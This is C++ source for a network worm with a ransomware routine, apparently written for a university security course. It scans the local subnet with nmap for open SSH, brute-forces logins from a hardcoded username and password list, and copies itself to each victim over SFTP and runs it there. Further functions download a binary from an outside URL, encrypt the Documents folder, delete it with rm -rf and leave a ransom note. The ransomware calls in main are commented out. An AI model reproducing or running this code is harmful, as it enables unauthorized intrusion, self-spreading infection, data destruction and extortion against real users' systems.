#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include<errno.h>
#include<strings.h>
#include<cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string>
#include <iostream>
#include <sstream>
#include <fstream>
#include <libssh/sftp.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<vector>
#include<map>
#include <curl/curl.h>
#include<exception>
#include<algorithm>
#include <unistd.h>
#include <string.h> /* for strncpy */
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
  
  
  
 std::ofstream myFile;
  
  
void markInfected() {
    std::ofstream myfile("/tmp/infectionMarker_extWCpp.txt");
  
    if (myfile.is_open())
    {
        myfile << "This system is infected\n" << std::endl;
        myfile.close();
	printf("\nCreated Infection marker on the System");
    }
    else
        printf("Unable to open file");
  
}

void markInfected2(std::string host) {
    std::ofstream myfile("/tmp/neenu.txt");
  
    if (myfile.is_open())
    {
        myfile << "This system is infected\n" << host.c_str() << std::endl;
        myfile.close();
	printf("\nCreated Infection marker on the System %d", host.c_str());
    }
    else
        printf("Unable to open file");
  
}
  
int isInfected(ssh_session session) {
    sftp_file file;
    int rc;
    sftp_session sftp;
    int access_type = O_RDONLY;
  
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return 11;
    }
  
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return 1;
    }
  
    file = sftp_open(sftp, "/tmp/infectionMarker_extWCpp.txt", access_type, 0);
    if (file == NULL) {
        printf("\nFile does not exist");
        return 0;
    }
    else {
        printf("\nSystem is already Infected\n");
        return 1;
    }
}
  
char* getMyIP(){

    int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
 
    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;
 
    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);
 
    ioctl(fd, SIOCGIFADDR, &ifr);
 
    close(fd);
 
    /* display result */
    printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

}

std::vector<std::string> getHostsOnSameNetwork() {
    FILE *fp;
    char path[1035];
    std::vector<std::string> res;
    int i;
  
    fp = popen("nmap 192.168.1.0/24 -p 22 --open | grep 'Nmap scan report for'| cut -f 5 -d ' '", "r");
    if (fp == NULL) {
        printf("\nFailed to run command");
        pclose(fp);
        //Need to put something
    }
    else {
        while (!feof(fp)) {
            if (fgets(path, sizeof(path), fp) != NULL) {
                res.push_back(path);
		myFile << "Inserting: " << path; 
            }
        }
  
        pclose(fp);
     	

        return res;
    }
}
  
size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}
  
void downloadOpenSSL() {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char *url = "http://ecs.fullerton.edu/~mgofman/openssl";
    char outfilename[FILENAME_MAX] = "openssl";
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outfilename, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        /* always cleanup */
        curl_easy_cleanup(curl);
    printf("\n Successfully Downloaded the openssl file");
        fclose(fp);
    }
     
}
  
  
int copyFile(ssh_session session) {
    sftp_file file;
    int rc;
    int access_type = O_WRONLY | O_CREAT | O_TRUNC;
    sftp_session sftp;
  
    sftp = sftp_new(session);
    if (sftp == NULL)
    {
        fprintf(stderr, "\nError allocating SFTP session: %s\n",
            ssh_get_error(session));
        return SSH_ERROR;
    }
    rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        sftp_free(sftp);
        return rc;
    }
  
    file = sftp_open(sftp, "/tmp/a.out",
        access_type, S_IRWXU);
    if (file == NULL)
    {
        fprintf(stderr, "\nCan't open remote file for writing: %s\n",
            ssh_get_error(session));
        return 0;
    }
  
    std::ifstream fin("/tmp/a.out", std::ios::binary);
    if (fin) {
        fin.seekg(0, std::ios::end);
        std::ios::pos_type length = fin.tellg(); // get file size in bytes
        fin.seekg(0); // rewind to beginning of file
  
        char* replicatorFile = new char[length];
        fin.read(replicatorFile, length); // read file contents into buffer
  
        sftp_write(file, replicatorFile, length); // write to remote file
    }
    else {
        return 0;
    }
  
    rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        fprintf(stderr, "\nCan't close the written file: %s\n",
            ssh_get_error(session));
        return 0;
    }
    printf("\nCopy Successfull !");
    return 1;
  
  
}
  
int executeFile(ssh_session session) {
    ssh_channel channel;
    int rc;
    channel = ssh_channel_new(session);
  
    if (channel != NULL) {
        rc = ssh_channel_open_session(channel);
        if (rc == SSH_OK) {
            if (copyFile(session)) {
                rc = ssh_channel_request_exec(channel, "/tmp/a.out > output.txt");
                if (rc == SSH_OK) {
                    printf("\nExecuted command on remote machine");
                }
                else {
                    printf("\nCannot give run permissions to the file");
                    return 0;
                }
            }
            else {
                printf("\nError While copying");
                return 0;
            }
        }
        else {
            printf("\nError establishing channel for executing remote");
            return 0;
        }
    }
    else {
        printf("\nCould not Connect to Host");
        return 0;
    }
}
  
int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
	 myFile <<"In connection: cstart";
    int rc;
    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    const char *username, *password;
  
  
    rc = ssh_connect(session);
  myFile <<"In connection: connecting";
    if (rc == SSH_OK) {
  
        if (ssh_write_knownhost(session) < 0) {
            fprintf(stderr, "Error %s", strerror(errno));
		 myFile <<"In connection: cannot write";
            	return 0;
        }
        else {
            for (std::map<std::string, std::string>::iterator it = dictAttackList.begin(); it != dictAttackList.end(); it++) {
  
                username = (it->first).c_str();
                password = (it->second).c_str();
  		 myFile <<"In connection: trying username" <<username <<password;
                rc = ssh_userauth_password(session, NULL, password);
                if (rc == SSH_AUTH_SUCCESS) {
                    printf("\nLogin Success");
 myFile <<"In connection: Login Success";
                    return 1;
                }
            }
            if (rc != SSH_AUTH_SUCCESS) {
                printf("\n Error Authenticating");
		 myFile <<"In connection: cannot autheticate";
            }
        }
  
    }
  
    else {
        fprintf(stderr, "\nError Connecting to localhost: %s\n", ssh_get_error(session));
        return 0;
    }
}
  
  
  
  
void initializeDict(std::map<std::string, std::string> &dictAttackList) {
    dictAttackList["ubuntu"] = "123456";
    dictAttackList["hello"] = "worlds";
    dictAttackList["cpsc"] = "c473";
    dictAttackList["network"] = "security";
    printf("\nDictionary Initialized !!!");
}
  
void tarAndEncrypt(){
    try{
            system("chmod a+x ./openssl");
            system("tar -zcvf DocumentsDir.tar.gz -P /home/ubuntu/Documents/");
            printf("\n Created tar of the Documents folder");
            system("./openssl aes-256-cbc -a -salt -in DocumentsDir.tar.gz -out DocumentsDir.tar.enc -k cpsc456worm");
            printf("\n Created Encrypted File");
        }
        catch(...){
            std::cout<<"Exception is occured";
        }
}
 
void deleteDirAndLeaveMessage() {
    system("rm -rf /home/ubuntu/Documents/");
    printf("\n Deleted Documents folder");
    system("cp DocumentsDir.tar.enc /home/ubuntu/Desktop/");
    std::ofstream myfile("/home/ubuntu/Desktop/SystemCompromisedCpp.txt");
 
    if (myfile.is_open())
    {
        myfile << "Your Documents Directory has been encrypted ! Pay me to get the decryption Key\n" << std::endl;
        myfile.close();
    }
    else
        printf("\n Unable to open file for wrtign Threat message");
}
  
int main() {
  
    ssh_session my_ssh_session;
    ssh_channel channel;
    int res;

myFile.open("/tmp/check.txt");
    std::map<std::string, std::string> dictAttackList;
    initializeDict(dictAttackList);
    markInfected();
myFile << "Cto If" <<std::endl;
	if(strcmp(getMyIP(), "192.168.1.4") != 0){
		//downloadOpenSSL();
                //tarAndEncrypt();
		//deleteDirAndLeaveMessage();
	}
myFile << "Came back"<<std::endl;
    std::vector<std::string> hosts = getHostsOnSameNetwork();
	myFile << "Came back after get hosts";
    for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
        std::cout << "\n Host: " << *host;
  	myFile << *host <<std::endl;
        my_ssh_session = ssh_new();
	
        if (my_ssh_session == NULL){
		myFile << "My ssh is NULL" << my_ssh_session <<std::endl;
		exit(-1);
	}           
 myFile << "My ssh is not null" << my_ssh_session <<std::endl;

        if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
            printf("\nSucceded to get into the host");
  		myFile << "Logged in to "<<*host <<std::endl;
            if (!isInfected(my_ssh_session)) {
		myFile << "this is not infected" <<*host<<std::endl;
                res = executeFile(my_ssh_session);
		
                if (res) {
                    
                    std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
                    break;
                }
            }
        }
    }
 myFile.close();
     
}
